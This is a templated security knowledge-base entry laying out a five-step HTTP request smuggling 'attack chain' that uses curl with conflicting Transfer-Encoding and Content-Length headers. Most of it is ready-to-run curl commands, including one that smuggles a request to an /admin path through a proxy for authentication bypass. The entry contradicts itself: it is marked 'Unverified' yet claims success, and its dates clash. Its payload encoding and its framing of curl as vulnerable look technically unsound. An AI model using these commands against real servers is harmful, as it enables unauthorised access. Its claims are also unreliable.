---
tags:
  - http-smuggling
  - curl-vulnerability
  - header-conflicts
  - authentication-bypass
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/Wireshark]]'
  - '[[tools/Python]]'
  - '[[tools/Docker]]'
  - '[[tools/tcpdump]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-conflicting-headers]]'
  - '[[commands/curl-proxy-smuggling-test]]'
  - '[[commands/curl-python-automated-test]]'
  - '[[commands/curl-version-check]]'
platforms:
  - Linux
  - Windows
complexity: medium
procedures:
  - '[[procedures/Create-Test-Request-with-Conflicting-Headers]]'
  - '[[procedures/Observe-cURL-Header-Behavior]]'
  - '[[procedures/Test-Smuggling-with-Proxy-Setup]]'
  - '[[procedures/Reproduce-Smuggling-with-Python-Script]]'
  - '[[procedures/Verify-Smuggling-with-Network-Capture]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
description: >-
  Multi-stage demonstration of HTTP Request Smuggling vulnerability in cURL by
  exploiting conflicting Transfer-Encoding and Content-Length headers to smuggle
  malicious payloads, potentially leading to authentication bypass and cache
  poisoning.
skill_level: intermediate
impact_level: high
id: 3e65097d-9de1-4223-8617-6aff1d5d2db9
created_at: '2025-12-13T09:01:21.810Z'
updated_at: '2025-12-13T09:01:21.810Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
---
# HTTP Request Smuggling via cURL Header Conflicts for Authentication Bypass

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Test Request] --> B[Observe Behavior]
    B --> C[Test with Proxy]
    C --> D[Reproduce with Script]
    D --> E[Verify with Capture]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#2ecc71
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/Wireshark]]
- [[tools/Python]]
- [[tools/Docker]]
- [[tools/tcpdump]]

### Target Environment

- Platforms: Windows 10, Linux Ubuntu 20.04
- Required services/ports: HTTP proxies, load balancers, firewalls
- Network access requirements: Access to test servers and proxies

### Initial Access Requirements

- Credential requirements: None for testing
- Network position: Local machine with internet access
- Prior access needed: Ability to set up test proxies

## Detailed Attack Procedures

### Step 1: Create Test Request with Conflicting Headers
procedure: [[procedures/Create-Test-Request-with-Conflicting-Headers]]

**Objective**: Craft an HTTP request using cURL with both Transfer-Encoding and Content-Length headers to test for smuggling potential.

**Instructions**: Use [[commands/curl-test-conflicting-headers]] to send a POST request with conflicting headers and a smuggled payload:

```bash
curl -v -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 100" -d "0\r\n\r\nSMUGGLED_PAYLOAD" http://example.com/test
```

**Expected Output**: HTTP request sent with both headers visible in verbose output.

**Success Indicators**:
- Both headers are included in the request
- cURL processes the request without rejection

### Step 2: Observe cURL Header Behavior
procedure: [[procedures/Observe-cURL-Header-Behavior]]

**Objective**: Monitor the request to confirm cURL sends both conflicting headers and processes using chunked encoding.

**Instructions**: Run the request from Step 1 with verbose output enabled via [[commands/curl-test-conflicting-headers]] and inspect the output to verify header presence.

```bash
curl -v -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 100" -d "0\r\n\r\nSMUGGLED_PAYLOAD" http://example.com/test
```

**Expected Output**: Verbose output showing both headers and chunked encoding usage.

**Success Indicators**:
- Confirmation of both headers in the sent request
- No error or rejection from cURL

### Step 3: Test Smuggling with Proxy Setup
procedure: [[procedures/Test-Smuggling-with-Proxy-Setup]]

**Objective**: Demonstrate smuggling by sending the request through a proxy that interprets headers differently.

**Instructions**: Set up a test proxy and use [[commands/curl-proxy-smuggling-test]] to send a request with a smuggled POST:

```bash
curl -v --proxy http://test-proxy:8080 -H "Transfer-Encoding: chunked" -H "Content-Length: 50" -X POST -d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com/public
```

**Expected Output**: Request sent through proxy, potentially smuggling the inner request.

**Success Indicators**:
- Proxy interprets Content-Length first
- Smuggled request is processed separately

### Step 4: Reproduce with Python Script
procedure: [[procedures/Reproduce-Smuggling-with-Python-Script]]

**Objective**: Automate the test using a Python script to run cURL with conflicting headers and capture output.

**Instructions**: Use [[commands/curl-python-automated-test]] within a Python script to reproduce:

```bash
curl -v --include -H "Transfer-Encoding: chunked" -H "Content-Length: 200" -X "POST" -d "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n" http://example.com/endpoint
```

**Expected Output**: Captured output showing request and response with smuggled GET.

**Success Indicators**:
- Script executes cURL successfully
- Smuggled request is visible in output

### Step 5: Verify with Network Capture
procedure: [[procedures/Verify-Smuggling-with-Network-Capture]]

**Objective**: Capture and analyze network traffic to confirm the presence of conflicting headers and smuggling behavior.

**Instructions**: Use [[tools/Wireshark]] or [[tools/tcpdump]] to capture traffic while running previous requests, then inspect for both headers and inconsistent interpretations.

**Expected Output**: Network capture showing both headers in the HTTP request.

**Success Indicators**:
- Both headers confirmed in traffic
- Variations in proxy/server interpretations observed

## Attack Chain Summary

### Key Achievements

1. Demonstrated cURL's failure to reject conflicting headers
2. Successfully smuggled payloads through proxies
3. Verified exploitation potential for authentication bypass and cache poisoning

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Adversary-in-the-Middle]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
